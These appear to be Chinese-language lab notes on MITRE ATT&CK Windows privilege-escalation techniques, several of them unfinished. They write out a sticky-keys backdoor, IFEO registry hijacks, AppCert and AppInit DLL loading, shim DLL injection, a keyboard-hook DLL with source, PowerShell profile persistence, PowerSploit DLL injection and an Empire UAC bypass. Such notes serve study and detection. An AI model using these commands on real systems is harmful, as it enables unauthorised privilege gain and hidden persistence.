# 提权/Privilege Escalation

## 未完成Access Token Manipulation-T1134

令牌操作的一种技术是使用从另一个进程“窃取”的令牌创建一个新进程。这是当受害者主机上正在运行的进程之一中存在的已经存在的访问令牌的令牌被检索，复制然后用于创建新进程时，使新进程承担该被盗令牌的特权。windows中还有一些相关的API：

```
OpenProcess		使用想要窃取的访问令牌打开一个进程
OpenProcesToken	获取该进程的访问令牌的句柄
DuplicateTokenEx	复制进程中存在的访问令牌
CreateProcessWithTokenW	使用新获取的访问令牌创建新流程
```

可参考https://docs.microsoft.com/en-us/windows/win32/api/

前提说明必须要有管理员权限才能进行这种方式的利用。

Runas命令可以在使用用户名密码的情况下执行命令

Runas /noprofile /user:s1\administrator cmd

![1574922678647](Privilege%20Escalation.assets/1574922678647.png)

还有Invoke-RunAs(Empire中的)

## Accessibility Features-T1015

Accessibility Features同时被归类为Persistence和Privilege Escalation，但是个人觉得更适合归类为Persistence一章，因为主要的作用还是维持权限。

Windows包含可访问性功能，这些功能可以在用户登录之前（例如，当用户在Windows登录屏幕上时）通过组合键启动。攻击者可以修改这些程序的启动方式，以获取命令提示符或后门程序，而无需登录系统。比如shift后门，通过五次shift按键调用C:\Windows\System32\sethc.exe。

通过命令修改sethc文件为cmd文件。

```
copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
```

![1574767433351](Privilege%20Escalation.assets/1574767433351.png)

实际上也可以通过注册表来进行操作，只修改注册表，不替换实际文件：

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
```

在桌面锁定的时候按下五次shift即可在没有进入桌面的情况下调用cmd

![1574767481596](Privilege%20Escalation.assets/1574767481596.png)

```
其他类似的功能还有
屏幕键盘： C:\Windows\System32\osk.exe
放大镜： C:\Windows\System32\Magnify.exe
旁白： C:\Windows\System32\Narrator.exe
显示切换器： C:\Windows\System32\DisplaySwitch.exe
App切换器： C:\Windows\System32\AtBroker.exe
```

## AppCert DLL-T1182

如果有进程使用了CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW或WinExec函数，那么此进程会读取注册表项：

```
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SessionManager\AppCertDlls
```

此项下的dll都会加载到此进程。（Win7下默认没有此项）

![1574767636462](Privilege%20Escalation.assets/1574767636462.png)

首先创建这个注册表项

![1574767651518](Privilege%20Escalation.assets/1574767651518.png)

指向一个DLL文件，这个DLL文件会使用MessageBox弹出一个对话框，C++代码为：

```c++
// mydll.cpp : Defines the entry point for the DLL application.
//
#!c
#include "stdafx.h"
#include "Windows.h"
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	MessageBox(NULL, "testAppCert DLLs", "attack", MB_OK| MB_ICONEXCLAMATION);
    return TRUE;
}
```

然后创建一个程序，使用CreateProcess创建进程，这里的代码含义为使用CreateProcess执行一个cmd命令，代码为（这里是直接使用的MSDN上给出的示例https://docs.microsoft.com/zh-cn/windows/win32/procthread/creating-processes）：

```c++
#include <windows.h>
#include <stdio.h>
#include <tchar.h>

void _tmain( int argc, TCHAR *argv[] )
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
    if( argc != 2 )
    {
        printf("Usage: %s [cmdline]\n", argv[0]);
        return;
    }
    // Start the child process. 
    if( !CreateProcess( NULL,   // No module name (use command line)
        argv[1],        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        printf( "CreateProcess failed (%d).\n", GetLastError() );
        return;
    }
    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );
    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}
```

此时编译出了两个文件，一个exe，一个DLL

![1574767762498](Privilege%20Escalation.assets/1574767762498.png)

执行TestCreateProcess.exe运行calc.exe（此时），可以看到dll已经被调用：

![1574767845396](Privilege%20Escalation.assets/1574767845396.png)

## AppInit DLLs-T1103

当User32.dll被调用时，会获取AppInit DLLs注册表项，如果有值，则会通过LoadLibrary()API加载，不使用User32.dll的程序是不需要加载这个注册表项的。（https://support.microsoft.com/en-us/help/197571/working-with-the-appinit-dlls-registry-value）

注册表位置：

```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows
```

![1574853484727](Privilege%20Escalation.assets/1574853484727.png)

使用和上一个AppCert相同的dll，也就是mydll.dll，同时LoadAPPInit_DLLS需要设置为1。

![1574853497124](Privilege%20Escalation.assets/1574853497124.png)

这个在设置完了发现需要重启之后才能生效，重启之后发现开机自动被调用（忽略MessageBox中的名称，这里用的是AppCert Dlls实验中的dll）

![1574853537829](Privilege%20Escalation.assets/1574853537829.png)

通过Process Explorer可以看到Chrome浏览器和搜狗拼音输入法都会自动调用User32.dll从而加载AppInit DLLs注册表中的c:\mydll.dll

![1574853575466](Privilege%20Escalation.assets/1574853575466.png)

同时cmd.exe也会调用User32.dll。是一个需要重点关注的注册表项。需要检测AppInit DLLs注册表动态，是否存在被修改的情况，同时可以通过APPLocker进行设置白名单，禁止通过AppInit DLLs调用dll。

## Application Shimming-T1138

Shims可用于在较新的环境中支持旧API，或在旧环境中支持新API。在计算机编程，一个Shims是一个小型数据库，是透明的拦截API调用和改变传递的参数，处理操作本身或把操作重定向到其他地方。

例如，Application Shimming应用程序允许开发人员将为WindowsXP创建的应用程序所写的修复在无需重写代码的情况下用于Win10。

​    Shim架构实现了一种API钩子，而windows API是通过一组DLL来实现的，windows系统上的每个应用程序导入这些DLL，并在内存中维护一个存储调用函数地址的表。

我们可以通过sdbinst工具将自定义的sdb数据库文件部署到计算机中，部署并注册数据库文件之后操作系统会在启动应用程序时启用兼容性修补程序。

首先生成了一个DLL文件用于测试，代码和APPCertdlls的一样，通过MessageBox弹一个窗。然后安装ApplicationCompatibilityToolkit工具（可参考https://support.microsoft.com/en-us/help/317510/how-to-use-the-compatibility-administrator-utility-in-windows），安装完成后通过命令行打开：

![1574853661528](Privilege%20Escalation.assets/1574853661528.png)

打开之后创建fix：

![1574854033613](Privilege%20Escalation.assets/1574854033613.png)

选择InjectDll：

![1574854044950](Privilege%20Escalation.assets/1574854044950.png)

设置希望被加载的dll路径：

![1574854066800](Privilege%20Escalation.assets/1574854066800.png)

然后确定下一步完成：

![1574854077679](Privilege%20Escalation.assets/1574854077679.png)

现在保存这个数据库名称：

![1574854087986](Privilege%20Escalation.assets/1574854087986.png)

保存之后会产生一个名为testShim.sdb的文件，此时执行还需要将sdb安装到系统的Shim库中

![1574854099518](Privilege%20Escalation.assets/1574854099518.png)

可以通过ApplicationCompatibilityToolkit直接安装，也可以通过sdbinst.exe进行安装（系统自带，可以直接运行）

![1574854143247](Privilege%20Escalation.assets/1574854143247.png)

![1574854148771](Privilege%20Escalation.assets/1574854148771.png)

安装完成之后可以看到已经安装的testShim：

![1574854159357](Privilege%20Escalation.assets/1574854159357.png)

此时运行putty时dll被加载：

![1574854180686](Privilege%20Escalation.assets/1574854180686.png)

需要卸载的话也可以使用sdbinst.exe进行卸载：

![1574854193712](Privilege%20Escalation.assets/1574854193712.png)

**防御与检测：**

试了一下已经会被天擎阻断操作，通过告警也可以看到安装过程会修改程序的注册表，可以主要检测是否在注册表中添加sdb文件，或者是系统日志是否存在调用sdbinst的情况。

![1574854232756](Privilege%20Escalation.assets/1574854232756.png)

## Bypass User Account Control-T1088

UAC也就是用户账户控制，它旨在通过将应用程序软件限制为标准用户权限，直到管理员，从而提高Microsoft Windows的安全性。

![1574923401665](Privilege%20Escalation.assets/1574923401665.png)

最直观的感受就是在使用administrator权限打开cmd时的这个提示。

Bypass UAC的方法是多种多样的，这里直接使用Empire的方式：

首先需要获取一个Empire的普通权限的Agent，在已经获取了Empire的Agent（即shell）时一个普通的 shell通过bypassuac可以绕过UAC的限制，同时还包括了mimikatz

![1574923414857](Privilege%20Escalation.assets/1574923414857.png)

现在有两个agents，一个带星号，一个不带星号，带星号的是提权成功的

```
(Empire: agents) > interact D5193USF
```

连接D5193USF，在C盘下生成txt会提示没有权限

```
(Empire: agents) > interact 8VE6CNG2
```

连接8VE6CNG2，可以直接在C盘下生成

![1574923437930](Privilege%20Escalation.assets/1574923437930.png)

成功绕过了UAC的限制生成了1.txt

![1574923448321](Privilege%20Escalation.assets/1574923448321.png)

![1574923453459](Privilege%20Escalation.assets/1574923453459.png)

## DLL Search Order Hijacking-T1038

从名称可以看到实际上这也就是一种DLL劫持，但是利用的是Windows在加载DLL时搜索顺序，一般情况下会从程序的当前目录搜索，但是也可能从其他路径进行加载。

如果攻击者在将要加载的DLL所在路径之前搜索的路径中放入了同名的恶意DLL，那么恶意DLL将被加载，这种攻击方式叫做DLL预加载攻击。

```
例：
Test.exe文件运行时会加载a.dll文件，如果攻击者知道test.exe搜索DLL路径的顺序为：
C:\
C:\aa\
C:\bb\
此时假设a.dll在C:\aa\目录下，那此时如果在C:\下放一个同名的DLL，那么它将在搜索到C:\aa\之前被test.exe被加载。
```

这个技术点同时属于Persistence，不同的应用场景会起到不同的作用，在提权的场景中如果Test.exe在执行时是以管理员权限执行的，则可以进行提权。

## Dylib Hijacking-T1157

MACOS

## Elevated Execution with Prompt-T1514

MACOS

## Emond-T1519

MACOS

## Exploitation for Privilege Escalation-T1068

算是一种思路，并不能算是技术，说的是通过本身已经有了一定权限的应用程序，然后进行提权。

## （未完成）Extra Window Memory Injection-T1181

https://modexp.wordpress.com/2018/08/26/process-injection-ctray/

## File System Permissions Weakness-T1044

这里的意思是利用文件权限弱点进行攻击，当一个程序以高权限运行时，通常会加载其他的二进制文件（如DLL文件），而这些DLL文件的权限设置不正确，可能会被修改，加入使用其他的DLL来替换原本应该被执行的DLL，则恶意DLL会被以高权限执行。

比如之前的VPN的提权漏洞，DLL文件的可写权限为Everyone（关键点），而主程序的执行权限为System，当创建一个DLL文件进行替换原文件时，恶意的DLL文件会以system权限执行。实际上和T1038的DLL Search Order Hijacking在原理上也是有一定的相似的。

## Hooking-T1179

类似于进程注入，攻击者可以使用钩子在另一个进程的上下文中加载和执行恶意代码，从而屏蔽执行过程，同时还允许访问进程的内存和可能的特权。通过正常使用调用功能时，使用HOOK机制能够通过连续调用来提供持久性。

这里直接使用逆向工程核心原理中的HOOK教程的代码来进行演示HOOK技术，拿键盘输入举例，首先了解一下在键盘输入时常规的Windows消息流：

```
1、 发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]。
2、 OS判断哪个应用程序中发生了事件，然后从[OS message queue]取出消息，添加到相应应用程序的[application message queue]中。
```

应用程序（如记事本）监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应事件的处理程序来进行处理。

![1574865422847](Privilege%20Escalation.assets/1574865422847.png)

从上图可以更形象的来理解这个过程。

下面直接利用原书中的示例代码来进行实验，通过编写的钩子（HOOK）文件来拦截notepad.exe的输入：

首先使用C++生成一个HookMain.exe文件，源代码为HookMain.cpp:

```
#include "stdio.h"
#include "conio.h"
#include "windows.h"

#define	DEF_DLL_NAME		"KeyHook.dll"
#define	DEF_HOOKSTART		"HookStart"
#define	DEF_HOOKSTOP		"HookStop"

typedef void (*PFN_HOOKSTART)();
typedef void (*PFN_HOOKSTOP)();

void main()
{
	HMODULE			hDll = NULL;
	PFN_HOOKSTART	HookStart = NULL;
	PFN_HOOKSTOP	HookStop = NULL;
	char			ch = 0;

	hDll = LoadLibraryA(DEF_DLL_NAME);
    if( hDll == NULL )
    {
        printf("LoadLibrary(%s) failed!!! [%d]", DEF_DLL_NAME, GetLastError());
        return;
    }

	HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);
	HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);
	HookStart();
	printf("press 'q' to quit!\n");
	while( _getch() != 'q' )	;
	HookStop();
	FreeLibrary(hDll);
}
```

然后生成一个DLL文件，名为KeyHook.dll，源代码为KeyHook.cpp:

```
#include "stdio.h"
#include "windows.h"

#define DEF_PROCESS_NAME		"notepad.exe"

HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
HWND g_hWnd = NULL;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
{
	switch( dwReason )
	{
        case DLL_PROCESS_ATTACH:
			g_hInstance = hinstDLL;
			break;
        case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	char szPath[MAX_PATH] = {0,};
	char *p = NULL;
	if( nCode >= 0 )
	{
		if( !(lParam & 0x80000000) )
		{
			GetModuleFileNameA(NULL, szPath, MAX_PATH);
			p = strrchr(szPath, '\\');
			if( !_stricmp(p + 1, DEF_PROCESS_NAME) )
				return 1;
		}
	}
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void HookStart()
	{
		g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);
	}
	__declspec(dllexport) void HookStop()
	{
		if( g_hHook )
		{
			UnhookWindowsHookEx(g_hHook);
			g_hHook = NULL;
		}
	}
#ifdef __cplusplus
}
#endif
```

将代码编译成对应的exe和dll文件之后我们进行测试。

首先打开HookMain.exe程序，然后程序会自动调用对应的DLL文件，然后使用ProcessExplorer查看发现此时notepad.exe还没有调用Keyhook.dll

![1574865501933](Privilege%20Escalation.assets/1574865501933.png)

在notepad.exe中尝试输入字母发现并不能输入，再次Search发现notepad已经调用了KeyHook.dll文件，键盘的输入被拦截。

![1574865521455](Privilege%20Escalation.assets/1574865521455.png)

这是一个简单的消息钩子，使用的API是SetWindowsHookEx()这个API，在使用SetWindowsHookEx()设置好钩子之后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入到响应进程，然后调用注册的钩子过程。攻击者可以通过钩子获取键盘输入、执行恶意代码、等等操作，同时还允许访问进程的内存和可能的特权。

这个技术点在Persistence和Privilege Escalation都有，但是感觉好像更适合权限维持。

## Image File Execution Options Injection

Image File Execution Options Injection简称IFEO（映像劫持），使开发人员可以将调试器附加到应用程序。比如将cmd.exe设置为notepad.exe调试器，在执行notepad.exe时，实际上执行的是cmd.exe（上可以设置开启启动，也可以设置关闭时启动等）。

演示的方式很简单，直接修改注册表：

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "cmd.exe"
```

![1574865572322](Privilege%20Escalation.assets/1574865572322.png)

可以看到运行notepad.exe的时候cmd.exe被执行了。此时如果执行的某程序（这里是notepad.exe）

## New Service-T1050

New Service也就是新的服务，实际上和Execution中的Service Execution-T1035差不多，但是文章中提到通过创建服务将权限从管理员升级到System，但是感觉好像没有这个必要吧？

## 未完成Parent PID Spoofing-T1502

父进程PID欺骗，一个进程通常直接从父进程或者调用进程中产生。而这种技术通过修改父进程来进行提权和检测绕过。



参考链接：https://blog.f-secure.com/detecting-parent-pid-spoofing/

## Path Interception-T1034

主要是说类似于可信任服务路径漏洞的一些情况，比如当一个程序使用了CreateProcess函数，并且没有正确的对CreateProcess函数中的第二个参数进行添加双引号，并且这个程序加载的二进制文件（也或者是安装目录，因为一般加载的文件都是在安装目录下）还存在空格，那么这个程序就可能存在这一漏洞。

其中powershell脚本工具Powerup就能够搜索系统中可能存在此类漏洞的程序。可信任服务路径漏洞的原理：

![1574866555386](Privilege%20Escalation.assets/1574866555386.png)

之前找到过这样的软件的漏洞，复现直接跳过了。

## Plist Modification

MACOS

## 未完成/Port Monitors

可以通过系统API来设置端口监视器，设置在对应端口启动时会加载的DLL。

## PowerShell Profile-T1504

PowerShell Profile就是Powershell的配置文件（profile.ps1），是一个Powershell在启动时会自动运行的脚本。

可以使用命令查看：

```
echo $profile
```

![1575364230270](Privilege%20Escalation.assets/1575364230270.png)

```
判断路径是否存在
Test-Path $profile
```

![1575364366615](Privilege%20Escalation.assets/1575364366615.png)

这里已经创建过一次，所以现在提示为true

使用powershell命令在对应的profile文件中插入命令（这里插入的是Start-Process calc.exe）

```
New-Item -Path $profile -Type File –Force
$string = 'Start-Process calc.exe'
$string | Out-File -FilePath $profile -Append
```

再次打开Powershell.exe时会弹出计算器。

![1575364807553](Privilege%20Escalation.assets/1575364807553.png)

## Process Injection-T1055

进程注入指的是在活动进程的地址空间中执行任意代码的方法。比如说在powershell.exe进程或者是notepad.exe进程中执行任意代码。

这里使用的是Powersploit中的Invoke-DllInjection.ps1工具：

```
. .\Invoke-DllInjection.ps1
Invoke-DllInjection -ProcessID 896 C:\Users\Administrator\Desktop\fortest.dll
```

![1575365764159](Privilege%20Escalation.assets/1575365764159.png)

执行完成之后看到弹窗，并且是和notepad还是一个窗口

![1575365810943](Privilege%20Escalation.assets/1575365810943.png)

参考链接：

https://pentestlab.blog/2017/04/04/dll-injection/

## 未完成Scheduled Task-T1053

参考执行篇，执行篇也没搞

## 未完成Service Registry Permissions Weakness-T1058

Windows将本地服务配置信息存储在注册表中的下HKLM\SYSTEM\CurrentControlSet\Services。可以通过服务控制器，sc.exe，PowerShell或Reg等工具来操纵存储在服务的注册表项下的信息，以修改服务的执行参数。通过访问控制列表和权限控制对注册表项的访问。

## 未完成SIP and Trust Provider Hijacking-T1198

参照Persistence篇

## SID-History Injection-T1178

 

## Sudo-T1169

 

## Sudo Caching-T1206

 

## Valid Accounts-T1078

有效账户。。。？认为是一种思路，而非具体的技术，就是说有了现在系统上已经存在的有效账户的凭据等等，来维持权限。

## Webshell-T1100

Webshell？
